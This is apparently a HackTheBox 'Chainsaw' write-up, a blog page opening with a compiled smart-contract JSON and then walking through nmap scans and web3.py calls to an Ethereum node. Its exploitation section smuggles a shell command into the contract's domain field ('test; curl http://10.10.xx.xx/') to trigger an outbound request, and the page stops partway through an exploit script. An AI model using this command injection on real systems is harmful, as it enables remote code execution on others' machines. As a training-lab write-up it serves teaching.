class="string">"0x60806040526040805190810160405280600a81526020017f676f6f676c652e636f6d000000000000000000000000000000000000000000008152506000908051906020019061004f929190610062565b5034801561005c57600080fd5b50610107565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a357805160ff19168380011785556100d1565b828001600101855582156100d1579182015b828111156100d05782518255916020019190600101906100b5565b5b5090506100de91906100e2565b5090565b61010491905b808211156101005760008160009055506001016100e8565b5090565b90565b6102d7806101166000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029"</span>,</span><br><span class="line">  <span class="attr">"deployedBytecode"</span>: <span class="string">"0x60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029"</span>,</span><br><span class="line">  <span class="attr">"sourceMap"</span>: <span class="string">"27:210:1:-;;;56:27;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;27:210;8:9:-1;5:2;;;30:1;27;20:12;5:2;27:210:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;"</span>,</span><br><span class="line">  <span class="attr">"deployedSourceMap"</span>: <span class="string">"27:210:1:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;;8:9:-1;5:2;;;30:1;27;20:12;5:2;88:75:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;88:75:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;166:68;;8:9:-1;5:2;;;30:1;27;20:12;5:2;166:68:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;130:6;153:5;146:12;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:75;:::o;166:68::-;223:6;215:5;:14;;;;;;;;;;;;:::i;:::-;;166:68;:::o;27:210::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o"</span>,</span><br><span class="line">  <span class="attr">"source"</span>: <span class="string">"pragma solidity ^0.4.24;\n\n\ncontract WeaponizedPing &#123;\n\n  string store = \"google.com\";\n\n  function getDomain() public view returns (string) &#123;\n      return store;\n  &#125;\n  function setDomain(string _value) public &#123;\n      store = _value;\n  &#125;\n\n&#125;\n\n"</span>,</span><br><span class="line">  <span class="attr">"sourcePath"</span>: <span class="string">"/opt/WeaponizedPing/WeaponizedPing.sol"</span>,</span><br><span class="line">  <span class="attr">"ast"</span>: &#123;</span><br><span class="line">    <span class="attr">"absolutePath"</span>: <span class="string">"/opt/WeaponizedPing/WeaponizedPing.sol"</span>,</span><br><span class="line">    <span class="attr">"exportedSymbols"</span>: &#123;</span><br><span class="line">      <span class="attr">"WeaponizedPing"</span>: [</span><br><span class="line">        <span class="number">80</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">  "networks": &#123;</span><br><span class="line">    "1543936419890": &#123;</span><br><span class="line">      "events": &#123;&#125;,</span><br><span class="line">      "links": &#123;&#125;,</span><br><span class="line">      "address": "0xaf6ce61d342b48cc992820a154fe0f533e5e487c",</span><br><span class="line">      "transactionHash": "0x5e94c662f1048fca58c07e16506f1636391f757b07c1b6bb6fbb4380769e99e1"</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  "schemaVersion": "2.0.1",</span><br><span class="line">  "updatedAt": "2018-12-04T15:24:57.205Z"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>address.txt</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x479C21df57F2deaB052C466E4de7E82539F6A988</span><br></pre></td></tr></table></figure><h2 id="WeaponizedPing-Analysis"><a href="#WeaponizedPing-Analysis" class="headerlink" title="WeaponizedPing: Analysis"></a>WeaponizedPing: Analysis</h2><p><code>WeaponizedPing</code> is a <a href="https://blockgeeks.com/guides/smart-contracts/" target="_blank" rel="noopener">smart contract</a>. smart contracts are written in a language called <a href="https://solidity.readthedocs.io/en/v0.5.12/" target="_blank" rel="noopener">solidity</a>. </p><p>The contract has a variable called <code>store</code> which holds the value <code>google.com</code> by default:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string store = <span class="string">"google.com"</span>;</span><br></pre></td></tr></table></figure><p>There are two functions, <code>getDomain()</code> which returns the value of <code>store</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDomain</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string)</span> </span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> store;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>And <code>setDomain()</code> which takes a string and changes the value of <code>store</code> from whatever it was to that string:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setDomain</span><span class="params">(string _value)</span> <span class="title">public</span> </span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     store = _value;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>From the name of the contract (<code>WeaponizedPing</code>), I assumed that <code>ping</code> gets executed on <code>store</code>. We can control <code>store</code> by calling <code>setDomain()</code>, if the <code>ping</code> command doesn’t get filtered we’ll be able to inject commands and get <code>RCE</code>. However to do all of that we need to be able to interact with the contract in the first place.</p><h2 id="WeaponizedPing-Interaction"><a href="#WeaponizedPing-Interaction" class="headerlink" title="WeaponizedPing: Interaction"></a>WeaponizedPing: Interaction</h2><p>Assuming that the contract is deployed on a publicly exposed <code>ethereum</code> node, I ran a full <code>nmap</code> scan to find the port on which the server is running:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nmap -p- -T5 chainsaw.htb --max-retries 1 -o nmapfull</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-22 19:08 EET</span><br><span class="line">Nmap scan report for chainsaw.htb (10.10.10.142)</span><br><span class="line">Host is up (2.8s latency).</span><br><span class="line">Not shown: 37555 closed ports, 27977 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21&#x2F;tcp   open  ftp</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">9810&#x2F;tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 674.00 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>I found another open port (9810), I ran a service scan on that port:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nmap -p 9810 -sV -sT -sC -o nmap9810 chainsaw.htb                                                                                                                          </span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-22 19:24 EET                                                                                                                                                    </span><br><span class="line">Nmap scan report for chainsaw.htb (10.10.10.142)</span><br><span class="line">Host is up (1.7s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">9810&#x2F;tcp open  unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP&#x2F;1.1 400 Bad Request</span><br><span class="line">|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent</span><br><span class="line">|     Access-Control-Allow-Origin: *</span><br><span class="line">|     Access-Control-Allow-Methods: *</span><br><span class="line">|     Content-Type: text&#x2F;plain</span><br><span class="line">|     Date: Fri, 22 Nov 2019 17:25:01 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP&#x2F;1.1 400 Bad Request</span><br><span class="line">|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent</span><br><span class="line">|     Access-Control-Allow-Origin: *</span><br><span class="line">|     Access-Control-Allow-Methods: *</span><br><span class="line">|     Content-Type: text&#x2F;plain</span><br><span class="line">|     Date: Fri, 22 Nov 2019 17:24:27 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP&#x2F;1.1 200 OK</span><br><span class="line">|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent</span><br><span class="line">|     Access-Control-Allow-Origin: *</span><br><span class="line">|     Access-Control-Allow-Methods: *</span><br><span class="line">|     Content-Type: text&#x2F;plain                                                                                                                                                                                    </span><br><span class="line">|     Date: Fri, 22 Nov 2019 17:24:30 GMT</span><br><span class="line">|_    Connection: close</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :                                      </span><br><span class="line">SF-Port9810-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;11&#x2F;22%Time&#x3D;5DD819CA%P&#x3D;x86_64-pc-linux-gnu%r(G</span><br><span class="line">SF:etRequest,118,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nAccess-Control-All</span><br><span class="line">SF:ow-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Type,\x20Accept,</span><br><span class="line">SF:\x20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-</span><br><span class="line">SF:Allow-Methods:\x20\*\r\nContent-Type:\x20text&#x2F;plain\r\nDate:\x20Fri,\x2</span><br><span class="line">SF:022\x20Nov\x202019\x2017:24:27\x20GMT\r\nConnection:\x20close\r\n\r\n40</span><br><span class="line">SF:0\x20Bad\x20Request&quot;)%r(HTTPOptions,100,&quot;HTTP&#x2F;1\.1\x20200\x20OK\r\nAcce</span><br><span class="line">SF:ss-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Ty</span><br><span class="line">SF:pe,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nA</span><br><span class="line">SF:ccess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text&#x2F;plain\r\nDa</span><br><span class="line">SF:te:\x20Fri,\x2022\x20Nov\x202019\x2017:24:30\x20GMT\r\nConnection:\x20c</span><br><span class="line">SF:lose\r\n\r\n&quot;)%r(FourOhFourRequest,118,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Requ</span><br><span class="line">SF:est\r\nAccess-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x2</span><br><span class="line">SF:0Content-Type,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:</span><br><span class="line">SF:\x20\*\r\nAccess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text&#x2F;</span><br><span class="line">SF:plain\r\nDate:\x20Fri,\x2022\x20Nov\x202019\x2017:25:01\x20GMT\r\nConne</span><br><span class="line">SF:ction:\x20close\r\n\r\n400\x20Bad\x20Request&quot;);</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 90.55 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>It responded to <code>HTTP</code> requests which means that the <code>JSON-RPC</code> server is <code>HTTP</code> based.<br>There are a lot of ways to interact with <code>ethereum</code> smart contracts, I used <a href="https://web3py.readthedocs.io/en/stable/index.html" target="_blank" rel="noopener"><code>web3</code> python library</a>. (<a href="https://www.dappuniversity.com/articles/web3-py-intro" target="_blank" rel="noopener">A great reference</a>)<br>I imported <code>Web3</code> and <code>eth</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br></pre></td></tr></table></figure><p>Then I created a new <code>web3</code> connection to <code>http://chainsaw.htb:9810</code> and saved it in a variable called <code>w3</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br></pre></td></tr></table></figure><p>To interact with the smart contract we need two things:</p><ul><li>The address of the contract: we got the address earlier from the <code>ftp</code> server (Note: that address changes everytime the box is reset).</li><li>The <a href="https://en.wikipedia.org/wiki/Application_binary_interface" target="_blank" rel="noopener"><code>ABI</code></a> (Application Binary Interface) of the contract: We can get it from the contract source.</li></ul><p>To get the <code>ABI</code> I used the <a href="https://ethereum.github.io/browser-solidity/" target="_blank" rel="noopener"><code>solidity IDE</code></a> to compile the contract then I clicked on “Details” and copied the <code>ABI</code>:<br><img src="/images/hackthebox/chainsaw/1.png" alt=""><br>I saved it in a file (<code>ABI.txt</code>) then I executed <code>echo -n</code> on <code>cat ABI.txt</code> to make it a single line:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# echo -n &#96;cat ABI.txt&#96;</span><br><span class="line">[ &#123; &quot;constant&quot;: true, &quot;inputs&quot;: [], &quot;name&quot;: &quot;getDomain&quot;, &quot;outputs&quot;: [ &#123; &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;payable&quot;: false, &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;constant&quot;: false, &quot;inputs&quot;: [ &#123; &quot;name&quot;: &quot;_value&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;setDomain&quot;, &quot;outputs&quot;: [], &quot;payable&quot;: false, &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;function&quot; &#125; ]</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>I saved the <code>ABI</code> and the address in variables:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">address = <span class="string">"0x0e8385E6A7b5f4fFE58a02bD506e53e9f3FAD453"</span></span><br></pre></td></tr></table></figure><p>Then I finally created the contract representation and saved it in the variable <code>contract</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br></pre></td></tr></table></figure><p>By using the <code>functions</code> property we can call any function that the contract has, let’s call the function <code>getDomain()</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(contract.functions.getDomain().call())</span><br></pre></td></tr></table></figure><p>Final <code>test.py</code> looks like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br><span class="line">abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">address = <span class="string">"0x0e8385E6A7b5f4fFE58a02bD506e53e9f3FAD453"</span></span><br><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">print(contract.functions.getDomain().call())</span><br></pre></td></tr></table></figure><p>Let’s run it:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;test.py </span><br><span class="line">google.com</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>It’s working fine, let’s try to change the domain by using <code>setDomain()</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.functions.setDomain(<span class="string">"test"</span>).transact()</span><br></pre></td></tr></table></figure><p><em>Note: When passing arguments to functions we have to use <code>transact()</code> instead of <code>call()</code>, to use <code>transact()</code> we need an account, that’s why I added this line:</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p><code>test.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br><span class="line">w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">address = <span class="string">"0x0e8385E6A7b5f4fFE58a02bD506e53e9f3FAD453"</span></span><br><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">contract.functions.setDomain(<span class="string">"test"</span>).transact()</span><br><span class="line">print(contract.functions.getDomain().call())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;test.py </span><br><span class="line">test</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>Great, now for the exploitation part.</p><h2 id="WeaponizedPing-Exploitation"><a href="#WeaponizedPing-Exploitation" class="headerlink" title="WeaponizedPing: Exploitation"></a>WeaponizedPing: Exploitation</h2><p>Let’s try to inject commands in the domain name and see if it’ll work, I injected a <code>curl</code> command and I ran a python server on port 80:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.functions.setDomain(<span class="string">"test; curl http://10.10.xx.xx/"</span>).transact()</span><br></pre></td></tr></table></figure><p><code>test.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br><span class="line">w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">address = <span class="string">"0x0e8385E6A7b5f4fFE58a02bD506e53e9f3FAD453"</span></span><br><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">contract.functions.setDomain(<span class="string">"test; curl http://10.10.xx.xx/"</span>).transact()</span><br><span class="line">print(contract.functions.getDomain().call())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;test.py </span><br><span class="line">test; curl http:&#x2F;&#x2F;10.10.xx.xx&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>After a few seconds I got a request:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# python -m SimpleHTTPServer 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.142 - - [22&#x2F;Nov&#x2F;2019 20:59:23] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure><p>Based on these tests I wrote this small exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, eth</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(address, ip, port)</span>:</span></span><br><span class="line">print(YELLOW + <span class="string">"[+] Starting"</span>)</span><br><span class="line">print(YELLOW + <span class="string">"[+] Connecting to chainsaw.htb:9810"</span>)</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">'http://chainsaw.htb:9810'</span>))</span><br><span class="line">print(GREEN + <span class="string">"[*] Connection Established"</span>)</span><br><span class="line">w3.eth.defaultAccount = w3.eth.accounts[<span class="number">0</span>]</span><br><span 